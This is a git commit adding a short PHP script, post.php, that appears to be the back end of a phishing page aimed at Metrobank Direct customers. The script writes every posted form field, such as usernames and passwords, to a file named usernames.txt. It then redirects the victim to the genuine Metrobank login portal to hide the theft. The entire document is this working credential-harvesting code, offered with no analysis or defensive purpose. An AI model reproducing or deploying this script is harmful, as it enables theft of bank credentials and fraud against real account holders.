e4aead7c18ae3315affac9873181c62289c080cc
Jovith Ngoho | Crazy Domains <Jovith.Ngoho@crazydomains.com>
2018-10-25 13:19:24 +0800

    first commit

---
+++ post.php
@@ -0,0 +1,17 @@
+
+ <?php
+
+header ('Location: https://personal.metrobankdirect.com/RetailInternetPortal/');
+$handle = fopen("usernames.txt", "a");
+foreach($_POST as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
+echo $_POST["username"];
+
+?>
